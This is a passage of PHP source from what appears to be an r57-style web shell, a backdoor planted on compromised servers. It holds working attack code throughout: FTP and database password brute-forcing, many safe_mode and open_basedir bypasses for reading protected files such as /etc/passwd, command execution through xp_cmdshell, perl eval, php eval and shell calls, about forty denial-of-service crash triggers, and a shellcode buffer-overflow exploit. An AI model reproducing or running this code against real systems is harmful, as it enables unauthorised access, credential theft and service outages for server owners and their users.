  if(!@ftp_login($connection,$_POST['ftp_login'],$_POST['ftp_password'])) { err(4); }
  else 
   {
   if($_POST['cmd']=="ftp_file_down") { if(chop($_POST['loc_file'])==$dir) { $_POST['loc_file']=$dir.((!$unix)?('\\'):('/')).basename($_POST['ftp_file']); } @ftp_get($connection,$_POST['loc_file'],$_POST['ftp_file'],$_POST['mode']);}
   if($_POST['cmd']=="ftp_file_up")   { @ftp_put($connection,$_POST['ftp_file'],$_POST['loc_file'],$_POST['mode']);}
   }
  }
 @ftp_close($connection);
 $_POST['cmd'] = "";
 }

if(!empty($_POST['cmd']) && (($_POST['cmd']=="ftp_brute") || ($_POST['cmd']=="db_brute")))
 {
 if($_POST['cmd']=="ftp_brute"){
  list($ftp_server,$ftp_port) = split(":",$_POST['ftp_server_port']);
  if(empty($ftp_port)) { $ftp_port = 21; }
  $connection = @ftp_connect ($ftp_server,$ftp_port,10);
 }else if($_POST['cmd']=="db_brute"){
   $connection = 1;
 }
 if(!$connection) { err(3); $_POST['cmd'] = ""; }
 else if(($_POST['brute_method']=='passwd') && (!$users=get_users('/etc/passwd'))){ echo "<table width=100% cellpadding=0 cellspacing=0 bgcolor=#000000><tr><td bgcolor=#333333><font color=red face=Verdana size=-2><div align=center><b>".$lang[$language.'_text96']."</b></div></font></td></tr></table>"; $_POST['cmd'] = ""; }
 else if(($_POST['brute_method']=='dic') && (!$users=get_users($_POST['dictionary']))){ echo "<table width=100% cellpadding=0 cellspacing=0 bgcolor=#000000><tr><td bgcolor=#333333><font color=red face=Verdana size=-2><div align=center><b>Can\'t get password list</b></div></font></td></tr></table>"; $_POST['cmd'] = ""; }
 if($_POST['cmd']=="ftp_brute"){@ftp_close($connection);}
 }

echo $table_up3;
if (empty($_POST['cmd']) && !$safe_mode) { $_POST['cmd']=(!$unix)?("dir"):("ls -lia"); }
else if(empty($_POST['cmd']) && $safe_mode){ $_POST['cmd']="safe_dir"; }
echo $font.$lang[$language.'_text1'].": <b>".$_POST['cmd']."</b></font></td></tr><tr><td><b><div align=center><textarea name=report cols=121 rows=15>";
{
 switch($_POST['cmd'])
 {
 case 'safe_dir':
 
  if (@function_exists('scandir') && ($d=@scandir($dir)) && !isset($_POST['glob']) && !isset($_POST['realpath']))
   {
   foreach ($d as $file)
    {
     if ($file=="." || $file=="..") continue;
     @clearstatcache();
     @list ($dev, $inode, $inodep, $nlink, $uid, $gid, $inodev, $size, $atime, $mtime, $ctime, $bsize) = stat($file);
     if(!$unix){ 
     echo date("d.m.Y H:i",$mtime);
     if(@is_dir($file)) echo "  <DIR> "; else printf("% 7s ",$size);
     }
     else{ 
     if(@function_exists('posix_getpwuid') && @function_exists('posix_getgrgid')){
      $owner = @posix_getpwuid($uid);
      $grgid = @posix_getgrgid($gid);
     }else{$owner['name']=$grgid['name']='';}
     echo $inode." ";
     echo perms(@fileperms($file));
     @printf("% 4d % 9s % 9s %7s ",$nlink,$owner['name'],$grgid['name'],$size);
     echo @date("d.m.Y H:i ",$mtime);
     }
     echo "$file\n";
    }
   }

  elseif (@function_exists('dir') && ($d=@dir($dir)) && !isset($_POST['glob']) && !isset($_POST['realpath']))
   {
   while (false!==($file=$d->read()))
    {
     if ($file=="." || $file=="..") continue;
     @clearstatcache();
     @list ($dev, $inode, $inodep, $nlink, $uid, $gid, $inodev, $size, $atime, $mtime, $ctime, $bsize) = stat($file);
     if(!$unix){ 
     echo date("d.m.Y H:i",$mtime);
     if(@is_dir($file)) echo "  <DIR> "; else printf("% 7s ",$size);
     }
     else{ 
     if(@function_exists('posix_getpwuid') && @function_exists('posix_getgrgid')){
      $owner = @posix_getpwuid($uid);
      $grgid = @posix_getgrgid($gid);
     }else{$owner['name']=$grgid['name']='';}
     echo $inode." ";
     echo perms(@fileperms($file));
     @printf("% 4d % 9s % 9s %7s ",$nlink,$owner['name'],$grgid['name'],$size);
     echo @date("d.m.Y H:i ",$mtime);
     }
     echo "$file\n";
    }
   $d->close();
   }
   
  elseif (@function_exists('opendir') && @function_exists('readdir') && ($d=@opendir($dir)) && !isset($_POST['glob']) && !isset($_POST['realpath']))
   {
   while (false!==($file=@readdir($d)))
    {
     if ($file=="." || $file=="..") continue;
     @clearstatcache();
     @list ($dev, $inode, $inodep, $nlink, $uid, $gid, $inodev, $size, $atime, $mtime, $ctime, $bsize) = stat($file);
     if(!$unix){ 
     echo date("d.m.Y H:i",$mtime);
     if(@is_dir($file)) echo "  <DIR> "; else printf("% 7s ",$size);
     }
     else{ 
     if(@function_exists('posix_getpwuid') && @function_exists('posix_getgrgid')){
      $owner = @posix_getpwuid($uid);
      $grgid = @posix_getgrgid($gid);
     }else{$owner['name']=$grgid['name']='';}
     echo $inode." ";
     echo perms(@fileperms($file));
     @printf("% 4d % 9s % 9s %7s ",$nlink,$owner['name'],$grgid['name'],$size);
     echo @date("d.m.Y H:i ",$mtime);
     }
     echo "$file\n";
    }
   @closedir($d);
   }

   elseif(@function_exists('glob') && (isset($_POST['glob']) || !isset($_POST['realpath'])))
    {
       echo "PHP glob() listing directory Safe_mode bypass Exploit\r\n\r\n";
       function eh($errno, $errstr, $errfile, $errline)
        {
          global $D, $c, $i; 
          preg_match("/SAFE\ MODE\ Restriction\ in\ effect\..*whose\ uid\ is(.*)is\ not\ allowed\ to\ access(.*)owned by uid(.*)/", $errstr, $o); 
          if($o){ $D[$c] = $o[2]; $c++;} 
        }
       $error_reporting = @ini_get('error_reporting');
       error_reporting(E_WARNING); 
       @ini_set("display_errors", 1); 
       @ini_alter("display_errors", 1); 
       $root = "/"; 
       if($dir) $root = $dir; 
       $c = 0; $D = array(); 
       @set_error_handler("eh"); 
       $chars = "_-.0123456789abcdefghijklnmopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ"; 
       for($i=0; $i < strlen($chars); $i++)
       {
        $path ="{$root}".((substr($root,-1)!="/") ? "/" : NULL)."{$chars[$i]}"; 
        $prevD = $D[count($D)-1]; 
        @glob($path."*"); 
        if($D[count($D)-1] != $prevD)
         {
           for($j=0; $j < strlen($chars); $j++)
           {
            $path ="{$root}".((substr($root,-1)!="/") ? "/" : NULL)."{$chars[$i]}{$chars[$j]}"; 
            $prevD2 = $D[count($D)-1]; 
            @glob($path."*"); 
            if($D[count($D)-1] != $prevD2)
             {
              for($p=0; $p < strlen($chars); $p++)
               {
                $path ="{$root}".((substr($root,-1)!="/") ? "/" : NULL)."{$chars[$i]}{$chars[$j]}{$chars[$p]}"; 
                $prevD3 = $D[count($D)-1]; 
                @glob($path."*"); 
                if($D[count($D)-1] != $prevD3)
                 {
                  for($r=0; $r < strlen($chars); $r++)
                   {
                    $path ="{$root}".((substr($root,-1)!="/") ? "/" : NULL)."{$chars[$i]}{$chars[$j]}{$chars[$p]}{$chars[$r]}"; 
                    @glob($path."*"); 
                   } 
                 }        
               } 
             }        
           }    
         } 
       } 
       $D = array_unique($D); 
       foreach($D as $item) echo "{$item}\r\n"; 
       echo "\r\n Generation time: ".round(@getmicrotime()-starttime,4)." sec\r\n";
       error_reporting($error_reporting);
    }
    elseif(@function_exists('realpath') && (!isset($_POST['glob']) || isset($_POST['realpath'])))
    {
       echo "PHP realpath() listing directory Safe_mode bypass Exploit\r\n\r\n";
       if(!$dir){$dir='/etc/';}; 
       if(!empty($_POST['end_rlph'])){$end_rlph=$_POST['end_rlph'];}else{$end_rlph='';}
       if(!empty($_POST['n_rlph'])){$n_rlph=$_POST['n_rlph'];}else{$n_rlph='3';}

       if($realpath=realpath($dir.'/')){echo $realpath."\r\n";}
       if($end_rlph!='' && $realpath=realpath($dir.'/'.$end_rlph)){echo $realpath."\r\n";}
       foreach($presets_rlph as $preset_rlph){
           if($realpath=realpath($dir.'/'.$preset_rlph.$end_rlph)){echo $realpath."\r\n";}
       }
       for($i=0; $i < strlen($chars_rlph); $i++){
          if($realpath=realpath($dir."/{$chars_rlph[$i]}".$end_rlph)){echo $realpath."\r\n";}
          if($n_rlph<=1){continue;};
          for($j=0; $j < strlen($chars_rlph); $j++){
             if($realpath=realpath($dir."/{$chars_rlph[$i]}{$chars_rlph[$j]}".$end_rlph)){echo $realpath."\r\n";}
             if($n_rlph<=2){continue;};
      	     for($x=0; $x < strlen($chars_rlph); $x++){
                if($realpath=realpath($dir."/{$chars_rlph[$i]}{$chars_rlph[$j]}{$chars_rlph[$x]}".$end_rlph)){echo $realpath."\r\n";}
                if($n_rlph<=3){continue;};
                for($y=0; $y < strlen($chars_rlph); $y++){
      	           if($realpath=realpath($dir."/{$chars_rlph[$i]}{$chars_rlph[$j]}{$chars_rlph[$x]}{$chars_rlph[$y]}".$end_rlph)){echo $realpath."\r\n";}
      	           if($n_rlph<=4){continue;};
      	           for($z=0; $z < strlen($chars_rlph); $z++){
      	              if($realpath=realpath($dir."/{$chars_rlph[$i]}{$chars_rlph[$j]}{$chars_rlph[$x]}{$chars_rlph[$y]}{$chars_rlph[$z]}".$end_rlph)){echo $realpath."\r\n";}
      	              if($n_rlph<=5){continue;};
      	              for($w=0; $w < strlen($chars_rlph); $w++){
      	                 if($realpath=realpath($dir."/{$chars_rlph[$i]}{$chars_rlph[$j]}{$chars_rlph[$x]}{$chars_rlph[$y]}{$chars_rlph[$z]}{$chars_rlph[$w]}".$end_rlph)){echo $realpath."\r\n";}
      		      }
      		   }
      	         }
              }
          }
       }
       echo "\r\n Generation time: ".round(@getmicrotime()-starttime,4)." sec\r\n";
    }	
    else echo $lang[$language.'_text29'];
 break;
 
  case 'test1':
  $ci = @curl_init("file://".$_POST['test1_file']);
  $cf = @curl_exec($ci);
  echo htmlspecialchars($cf);
  break;
  case 'test2':
  @include($_POST['test2_file']);
  break;
  case 'test3':
  if(empty($_POST['test3_port'])) { $_POST['test3_port'] = "3306"; }
  $db = @mysql_connect('localhost:'.$_POST['test3_port'],$_POST['test3_ml'],$_POST['test3_mp']);
  if($db)
   {
   if(@mysql_select_db($_POST['test3_md'],$db))
    {
     @mysql_query("DROP TABLE IF EXISTS temp_r57_table");
     @mysql_query("CREATE TABLE `temp_r57_table` ( `file` LONGBLOB NOT NULL )");
/*     @mysql_query("LOAD DATA INFILE \"".$_POST['test3_file']."\" INTO TABLE temp_r57_table");*/
     @mysql_query("LOAD DATA LOCAL INFILE \"".$_POST['test3_file']."\" INTO TABLE temp_r57_table");
     $r = @mysql_query("SELECT * FROM temp_r57_table");
     while(($r_sql = @mysql_fetch_array($r))) { echo @htmlspecialchars($r_sql[0])."\r\n"; }
     @mysql_query("DROP TABLE IF EXISTS temp_r57_table");
    }
    else echo "[-] ERROR! Can't select database";
   @mysql_close($db);
   }
  else echo "[-] ERROR! Can't connect to mysql server";
  break;
  case 'test4':
  if(empty($_POST['test4_port'])) { $_POST['test4_port'] = "1433"; }
  $db = @mssql_connect('localhost,'.$_POST['test4_port'],$_POST['test4_ml'],$_POST['test4_mp']);
  if($db)
   {
   if(@mssql_select_db($_POST['test4_md'],$db))
    {
     @mssql_query("drop table r57_temp_table",$db);
     @mssql_query("create table r57_temp_table ( string VARCHAR (500) NULL)",$db);
     @mssql_query("insert into r57_temp_table EXEC master.dbo.xp_cmdshell '".$_POST['test4_file']."'",$db);
     $res = mssql_query("select * from r57_temp_table",$db);
     while(($row=@mssql_fetch_row($res)))
      {
      echo htmlspecialchars($row[0])."\r\n";
      }
    @mssql_query("drop table r57_temp_table",$db);
    }
    else echo "[-] ERROR! Can't select database";
   @mssql_close($db);
   }
  else echo "[-] ERROR! Can't connect to MSSQL server";
  break;
  case 'test5':
  $temp=tempnam($dir, "fname");
  if (@file_exists($temp)) @unlink($temp);
  $extra = "-C ".$_POST['test5_file']." -X $temp";
  @mb_send_mail(NULL, NULL, NULL, NULL, $extra);
  $str = moreread($temp);
  echo htmlspecialchars($str);
  @unlink($temp);
  break;
  case 'test6':
  $stream = @imap_open('/etc/passwd', "", "");
  $dir_list = @imap_list($stream, trim($_POST['test6_file']), "*");
  for ($i = 0; $i < count($dir_list); $i++) echo htmlspecialchars($dir_list[$i])."\r\n";
  @imap_close($stream);
  break;
  case 'test7':
  $stream = @imap_open($_POST['test7_file'], "", "");
  $str = @imap_body($stream, 1);
  echo htmlspecialchars($str);
  @imap_close($stream);
  break;
  case 'test8':
  $temp=@tempnam($_POST['test8_file2'], "copytemp");
  $str = readzlib($_POST['test8_file1'],$temp);
  echo htmlspecialchars($str);
  @unlink($temp);
  break;
  
  case 'test9':
  @ini_restore("safe_mode");
  @ini_restore("open_basedir");
  $str = moreread($_POST['test9_file']);
  echo htmlspecialchars($str);
  break;
  case 'test10':
  @ob_clean();
  $error_reporting = @ini_get('error_reporting');
  error_reporting(E_ALL ^ E_NOTICE);
  @ini_set("display_errors", 1); 
  @ini_alter("display_errors", 1); 
  $str=@fopen($_POST['test10_file'],"r");
  while(!feof($str)){print htmlspecialchars(fgets($str));}
  fclose($str);
  error_reporting($error_reporting);
  break;
  case 'test11':
  @ob_clean();
  $temp = 'zip://'.$_POST['test11_file'];
  $str = moreread($temp);
  echo htmlspecialchars($str);
  break;
  case 'test12':
  @ob_clean();
  $temp = 'compress.bzip2://'.$_POST['test12_file'];
  $str = moreread($temp);
  echo htmlspecialchars($str);
  break;
  case 'test13':
  @error_log($_POST['test13_file1'], 3, "php://../../../../../../../../../../../".$_POST['test13_file2']);
  echo $lang[$language.'_text61'];
  break;
  case 'test14':
  @session_save_path($_POST['test14_file2']."\0;$tempdir");
  @session_start();
  @$_SESSION[php]=$_POST['test14_file1'];
  echo $lang[$language.'_text61'];
  break;
  case 'test15':
  @readfile($_POST['test15_file1'], 3, "php://../../../../../../../../../../../".$_POST['test15_file2']);
  echo $lang[$language.'_text61'];
  
    break;
  case 'test_5_2_6':
echo getcwd()."\n";
chdir($_POST['test_5_2_6']);
echo getcwd()."\n";
  break;
  
  
    case 'test2_5_2_6':
var_dump(posix_access($_POST['test15_file1']));

  break;
  
      case 'test_5_2_4':
//PHP 5.2.4 ionCube extension safe_mode and disable_functions protections bypass

//author: shinnai
//mail: shinnai[at]autistici[dot]org
//site: http://shinnai.altervista.org

//Tested on xp Pro sp2 full patched, worked both from the cli and on apache

//Technical details:
//ionCube version: 6.5
//extension: ioncube_loader_win_5.2.dll (other may also be vulnerable)
//url: www.egyspider.eu

//php.ini settings:
//safe_mode = On
//disable_functions = ioncube_read_file, readfile

//Description:
//This is useful to obtain juicy informations but also to retrieve source
//code of php pages, password files, etc... you just need to change file path.
//Anyway, don't worry, nobody will read your obfuscated code :)

//greetz to: BlackLight for help me to understand better PHP

//P.S.
//This extension contains even an interesting ioncube_write_file function...

if (!extension_loaded("ionCube Loader")) die("ionCube Loader extension required!  You are now can establish any order");

$path = str_repeat("..\\", 20);

$MyBoot_readfile = readfile($path."windows\\system.ini"); #just to be sure that I set correctely disable_function :)

$MyBoot_ioncube = ioncube_read_file($path."boot.ini");

echo $MyBoot_readfile;

echo "<br><br>ionCube output:<br><br>";

echo $MyBoot_ioncube;
  break;
  
  
  
      case 'egy_perl':
if(!extension_loaded('perl'))die('perl extension is not loaded');
if(!isset($_GET))$_GET=&$HTTP_GET_VARS;
if(empty($_GET['cmd']))$_GET['cmd']=(strtoupper(substr(PHP_OS,0,3))=='WIN')?'dir':'ls';
$perl=new perl();
echo "<textarea rows='25' cols='75'>";
$perl->eval("system('".$_GET['cmd']."')");
echo "</textarea>";
$_GET['cmd']=htmlspecialchars($_GET['cmd']);
  break;
  
      break;
  case 'egy_4_2_0':
    for ($i = 0; $i < 60000; $i++)
      {
        if (($tab = @posix_getpwuid($i)) != NULL)
          {
            echo $tab['name'].":";
            echo $tab['passwd'].":";
            echo $tab['uid'].":";
            echo $tab['gid'].":";
            echo $tab['gecos'].":";
            echo $tab['dir'].":";
            echo $tab['shell']."<br>";
          }
      }
  break;


  case 'egy_5_2_3':
//PHP 5.2.3 win32std extension safe_mode and disable_functions protections bypass

//author: egy spider
//mail: egy_spider@hotmail.com
//site: http://egyspider.eu

//Tested on xp Pro sp2 full patched, worked both from the cli and on apache

//Thanks to rgod for all his precious advises :)

//I set php.ini in this way:
//safe_mode = On
//disable_functions = system
//if you launch the exploit from the cli, cmd.exe will be wxecuted
//if you browse it through apache, you'll see a new cmd.exe process activated in taskmanager

if (!extension_loaded("win32std")) die("win32std extension required!");
system("cmd.exe"); //just to be sure that protections work well
win_shell_execute("..\\..\\..\\..\\windows\\system32\\cmd.exe");
  break;

  break;
  
  
  case 'test16':
  if (@fopen('srpath://../../../../../../../../../../../'.$_POST['test16_file'],"a")) echo $lang[$language.'_text61'];
  break;
  case 'test17_1':
  @unlink('symlinkread');
  @symlink('a/a/a/a/a/a/', 'dummy');
  @symlink('dummy/../../../../../../../../../../../'.$_POST['test17_file'], 'symlinkread');
  @unlink('dummy');
  while (1) 
   {
    @symlink('.', 'dummy');
    @unlink('dummy');
   }
  break;
  case 'test17_2':
  $str='';
  while (strlen($str) < 3) {   
/*   $str = moreread('symlinkread');*/
   $str = @file_get_contents('symlinkread');
   if($str){ @ob_clean(); echo htmlspecialchars($str);}
  }
  break;
  case 'test17_3':
  $dir = $files = array();
  if(@version_compare(@phpversion(),"5.0.0")>=0){
   while (@count($dir) < 3) {
    $dir=@scandir('symlinkread');
    if (@count($dir) > 2) {@ob_clean(); @print_r($dir); }
   }
  }
  else {
   while (@count($files) < 3) {
    $dh  = @opendir('symlinkread');
    while (false !== ($filename = @readdir($dh))) {
     $files[] = $filename;
    }
    if(@count($files) > 2){@ob_clean(); @print_r($files); }
   }
  }
  break;
  case 'test18':
  @putenv("TMPDIR=".$_POST['test18_file2']); 
  @ini_set("session.save_path", ""); 
  @ini_alter("session.save_path", ""); 
  @session_start();
  @$_SESSION[php]=$_POST['test18_file1'];
  echo $lang[$language.'_text61'];
  break;
  case 'test19':
  if(empty($_POST['test19_port'])) { $_POST['test19_port'] = "3306"; }
  $m = new mysqli('localhost',$_POST['test19_ml'],$_POST['test19_mp'],$_POST['test19_md'],$_POST['test19_port']);
  if(@mysqli_connect_errno()){ echo "[-] ERROR! Can't connect to mysqli server: ".mysqli_connect_error() ;};
  $m->options(MYSQLI_OPT_LOCAL_INFILE, 1);
  $m->set_local_infile_handler("r");
  $m->query("DROP TABLE IF EXISTS temp_r57_table");
  $m->query("CREATE TABLE temp_r57_table ( 'file' LONGBLOB NOT NULL )");
  $m->query("LOAD DATA LOCAL INFILE \"".$_POST['test19_file']."\" INTO TABLE temp_r57_table");
  $r = $m->query("SELECT * FROM temp_r57_table");
  while(($r_sql = @mysqli_fetch_array($r))) { echo @htmlspecialchars($r_sql[0])."\r\n"; }
  $m->query("DROP TABLE IF EXISTS temp_r57_table");
  $m->close();
  break;
 }
}

if((!$safe_mode) && ($_POST['cmd']!="php_eval") && ($_POST['cmd']!="mysql_dump") && ($_POST['cmd']!="db_query") && ($_POST['cmd']!="ftp_brute") && ($_POST['cmd']!="db_brute")){
 $cmd_rep = ex($_POST['cmd']);
 if(!$unix) { echo @htmlspecialchars(@convert_cyr_string($cmd_rep,'d','w'))."\n"; }
 else { echo @htmlspecialchars($cmd_rep)."\n"; }
}/*elseif($safe_mode){
 $cmd_rep = safe_ex($_POST['cmd']);
 if(!$unix) { echo @htmlspecialchars(@convert_cyr_string($cmd_rep,'d','w'))."\n"; }
 else { echo @htmlspecialchars($cmd_rep)."\n"; }
}
*/

switch($_POST['cmd'])
{
 case 'dos1':
 function a() { a(); } a();
 break;
 case 'dos2':
 @pack("d4294967297", 2);
 break;
 case 'dos3':
 $a = "a";@unserialize(@str_replace('1', 2147483647, @serialize($a)));
 break;
 case 'dos4':
 $t = array(1);while (1) {$a[] = &$t;};
 break;
 case 'dos5':
 @dl("sqlite.so");$db = new SqliteDatabase("foo");
 break;
 case 'dos6':
 preg_match('/(.(?!b))*/', @str_repeat("a", 10000));
 break;
 case 'dos7':
 @str_replace("A", str_repeat("B", 65535), str_repeat("A", 65538));
 break;
 case 'dos8':
 @shell_exec("killall -11 httpd");
 break;
 case 'dos9':
 function cx(){ @tempnam("/www/", '../../../../../..'.$tempdir.'cx'); cx(); } cx();
 break;
 case 'dos10':
 $a = @str_repeat ("A",438013);$b = @str_repeat ("B",951140);@wordwrap ($a,0,$b,0);
 break;
 case 'dos11':
 @array_fill(1,123456789,"Infigo-IS");
 break;
 case 'dos12':
 @substr_compare("A","A",12345678);
 break;
 case 'dos13':
 @unserialize("a:2147483649:{");
 break;
 case 'dos14':
 $Data = @str_ireplace("\n", "<br>", $Data);
 break;
 case 'dos15':
 function toUTF($x) {return chr(($x >> 6) + 192) . chr(($x & 63) + 128);}
 $str1 = "";for($i=0; $i < 64; $i++){ $str1 .= toUTF(977);}
 @htmlentities($str1, ENT_NOQUOTES, "UTF-8");
 break;
 case 'dos16':
 $r = @zip_open("x.zip");$e = @zip_read($r);$x = @zip_entry_open($r, $e);
 for ($i=0; $i<1000; $i++) $arr[$i]=array(array(""));
 unset($arr[600]);@zip_entry_read($e, -1);unset($arr[601]);
 break;
 case 'dos17':
 $z = "UUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUU"; 
 $y = "DDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDD"; 
 $x = "AQ                                                                        "; 
 unset($z);unset($y);$x = base64_decode($x);$y = @sqlite_udf_decode_binary($x);unset($x);
 break;
 case 'dos18':
 $MSGKEY = 519052;$msg_id = @msg_get_queue ($MSGKEY, 0600); 
 if (!@msg_send ($msg_id, 1, 'AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHH', false, true, $msg_err)) 
 echo "Msg not sent because $msg_err\n"; 
 if (@msg_receive ($msg_id, 1, $msg_type, 0xffffffff, $_SESSION, false, 0, $msg_error)) { 
 echo "$msg\n"; 
 } else { echo "Received $msg_error fetching message\n"; break; } 
 @msg_remove_queue ($msg_id);
 break;
 case 'dos19':
 $url = "php://filter/read=OFF_BY_ONE./resource=/etc/passwd"; @fopen($url, "r");
 break;
 case 'dos20':
 $hashtable = str_repeat("A", 39);
 $hashtable[5*4+0]=chr(0x58);$hashtable[5*4+1]=chr(0x40);$hashtable[5*4+2]=chr(0x06);$hashtable[5*4+3]=chr(0x08);
 $hashtable[8*4+0]=chr(0x66);$hashtable[8*4+1]=chr(0x77);$hashtable[8*4+2]=chr(0x88);$hashtable[8*4+3]=chr(0x99);
 $str = 'a:100000:{s:8:"AAAABBBB";a:3:{s:12:"0123456789AA";a:1:{s:12:"AAAABBBBCCCC";i:0;}s:12:"012345678AAA";i:0;s:12:"012345678BAN";i:0;}';
 for ($i=0; $i<65535; $i++) { $str .= 'i:0;R:2;'; }
 $str .= 's:39:"XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX";s:39:"'.$hashtable.'";i:0;R:3;';
 @unserialize($str);
 break;
 case 'dos21':
 imagecreatetruecolor(1234,1073741824);
 break;
 case 'dos22':
 imagecopyresized(imagecreatetruecolor(0x7fffffff, 120),imagecreatetruecolor(120, 120), 0, 0, 0, 0, 0x7fffffff, 120, 120, 120);
 break;
 case 'dos23':
 $a = str_repeat ("A",9989776); $b = str_repeat("/", 2798349); iconv_substr($a,0,1,$b);
 break;
 case 'dos24':
 setlocale(LC_COLLATE, str_repeat("A", 34438013));
 break;
 case 'dos25':
 glob(str_repeat("A", 9638013));
 break;
 case 'dos26':
 glob("a",-1);
 break;
 case 'dos27':
 fnmatch("*[1]e", str_repeat("A", 9638013));
 break;
 case 'dos28':
 if (extension_loaded("gd")){ $buff = str_repeat("A",9999); $res = imagepsloadfont($buff); echo "boom!!\n";}
 break;
 case 'dos29':
 if(function_exists('msql_connect')){ msql_pconnect(str_repeat('A',49424).'BBBB'); msql_connect(str_repeat('A',49424).'BBBB');}
 break;
 case 'dos30':
 $a=str_repeat("A", 65535);  $b=1;  $c=str_repeat("A", 65535);  chunk_split($a,$b,$c);
 break;
 case 'dos31':
 if (extension_loaded("win32std") ) { win_browse_file( 1, NULL, str_repeat( "\x90", 264 ), NULL, array( "*" => "*.*" ) );}
 break;
 case 'dos32':
 if (extension_loaded( "iisfunc" ) ){ $buf_unicode = str_repeat( "A", 256 ); $eip_unicode = "\x41\x41"; iis_getservicestate( $buf_unicode . $eip_unicode );}
 break;
 case 'dos33':
 $buff = str_repeat("\x41", 250);$get_EIP = "\x42\x42";$get_ESP = str_repeat("\x43", 100);$get_EBP = str_repeat("\x44", 100);ntuser_getuserlist($buff.$get_EIP.$get_ESP.$get_EBP);
 break;
 case 'dos34':
 if (extension_loaded("bz2")){ $buff = str_repeat("a",1000); com_print_typeinfo($buff);}
 break;
 case 'dos35':
 $a = str_repeat("/", 4199000); iconv(1, $a, 1);
 break;
 case 'dos36':
 $a = str_repeat("/", 2991370); iconv_mime_decode_headers(0, 1, $a);
 break;
 case 'dos37':
 $a = str_repeat("/", 3799000); iconv_mime_decode(1, 0, $a);
 break;
  case 'dos39':
 sprintf("[%'A2147483646s]\n", "A");
 break;
  break;
  case 'dos40':
// PHP <= 4.4.6 mssql_connect() & mssql_pconnect() local buffer overflow
// poc exploit (and safe_mode bypass)
// windows 2000 sp3 en / seh overwrite
// by rgod
// site: http://egyspider.eu

// u can easily adjust for php5
// this as my little contribute to MOPB

$____scode=
"\xeb\x1b".
"\x5b".
"\x31\xc0".
"\x50".
"\x31\xc0".
"\x88\x43\x59".
"\x53".
"\xbb\xca\x73\xe9\x77". //WinExec
"\xff\xd3".
"\x31\xc0".
"\x50".
"\xbb\x5c\xcf\xe9\x77". //ExitProcess
"\xff\xd3".
"\xe8\xe0\xff\xff\xff".
"\x63\x6d\x64".
"\x2e".
"\x65".
"\x78\x65".
"\x20\x2f".
"\x63\x20".
"start notepad & ";

   $eip="\xdc\xf5\x12";
   $____suntzu=str_repeat("\x90",100);
   $____suntzu.=$____scode;
   $____suntzu.=str_repeat("a",2460 - strlen($____scode));
   $____suntzu.=$eip;
 break;
 case 'zend':
 if(empty($_POST['zend'])){
} else {

$dezend=$_POST['zend'];
include($_POST['zend']);
print_r($GLOBALS);
require_once("$dezend");
echo "</textarea></p>";
}
break;
 case 'dos38':
 $a = str_repeat("/", 9791999); iconv_strlen(1, $a);
 break;
}
if ($_POST['cmd']=="php_eval"){
 $eval = @str_replace("<?","",$_POST['php_eval']);
 $eval = @str_replace("?>","",$eval);
 @eval($eval);}

if ($_POST['cmd']=="ftp_brute")
 {
 $suc = 0;
 if($_POST['brute_method']=='passwd'){
 foreach($users as $user)
  {
    $connection = @ftp_connect($ftp_server,$ftp_port,10);
    if(@ftp_login($connection,$user,$user)) { echo "[+] $user:$user - success\r\n"; $suc++; }
    else if(isset($_POST['reverse'])) { if(@ftp_login($connection,$user,strrev($user))) { echo "[+] $user:".strrev($user)." - success\r\n"; $suc++; } } 
    @ftp_close($connection);
  }
 }else if(($_POST['brute_method']=='dic') && isset($_POST['ftp_login'])){
  foreach($users as $user)
  {
    $connection = @ftp_connect($ftp_server,$ftp_port,10);
    if(@ftp_login($connection,$_POST['ftp_login'],$user)) { echo "[+] ".$_POST['ftp_login'].":$user - success\r\n"; $suc++; }
    @ftp_close($connection);
  }
 }
 echo "\r\n-------------------------------------\r\n";
 $count = count($users);
 if(isset($_POST['reverse']) && ($_POST['brute_method']=='passwd')) { $count *= 2; }
 echo $lang[$language.'_text97'].$count."\r\n";
 echo $lang[$language.'_text98'].$suc."\r\n";
 }

if ($_POST['cmd']=="db_brute")
 {
 $suc = 0;
 if($_POST['brute_method']=='passwd'){
 foreach($users as $user)
  {
   $sql = new my_sql();
   $sql->db   = $_POST['db'];
   $sql->host = $_POST['db_server'];
   $sql->port = $_POST['db_port'];
   $sql->user = $user;
   $sql->pass = $user;
   if($sql->connect()) { echo "[+] $user:$user - success\r\n"; $suc++; }
  }
 if(isset($_POST['reverse']))
  {
   foreach($users as $user)
    {
     $sql = new my_sql();
     $sql->db   = $_POST['db'];
     $sql->host = $_POST['db_server'];
     $sql->port = $_POST['db_port'];
     $sql->user = $user;
     $sql->pass = strrev($user);
     if($sql->connect()) { echo "[+] $user:".strrev($user)." - success\r\n"; $suc++; }
    }
  }
 }else if(($_POST['brute_method']=='dic') && isset($_POST['mysql_l'])){
  foreach($users as $user)
  {
   $sql = new my_sql();
   $sql->db   = $_POST['db'];
   $sql->host = $_POST['db_server'];
   $sql->port = $_POST['db_port'];
   $sql->user = $_POST['mysql_l'];
   $sql->pass = $user;
   if($sql->connect()) { echo "[+] ".$_POST['mysql_l'].":$user - success\r\n"; $suc++; }
  }
 }
 echo "\r\n-------------------------------------\r\n";
 $count = count($users);
 if(isset($_POST['reverse']) && ($_POST['brute_method']=='passwd')) { $count *= 2; }
 echo $lang[$language.'_text97'].$count."\r\n";
 echo $lang[$language.'_text98'].$suc."\r\n";
 }

if ($_POST['cmd']=="mysql_dump")
 {
  if(isset($_POST['dif'])) { morewrite($_POST['dif_name'], "mysql_dump\r\n"); }
  $sql = new my_sql();
  $sql->db   = $_POST['db'];
  $sql->host = $_POST['db_server'];
  $sql->port = $_POST['db_port'];
  $sql->user = $_POST['mysql_l'];
  $sql->pass = $_POST['mysql_p'];
  $sql->base = $_POST['mysql_db'];
  if(!$sql->connect()) { echo "[-] ERROR! Can't connect to SQL server"; }
  else if(!$sql->select_db()) { echo "[-] ERROR! Can't select database"; }
  else if(!$sql->dump($_POST['mysql_tbl'])) { echo "[-] ERROR! Can't create dump"; }
  else {
   if(empty($_POST['dif'])) { foreach($sql->dump as $v) echo $v."\r\n"; }
   else if(@is_writable($_POST['dif_name'])){ foreach($sql->dump as $v){ morewrite($_POST['dif_name'], $v."\r\n");} } 
   else { echo "[-] ERROR! Can't write in dump file"; }
   }
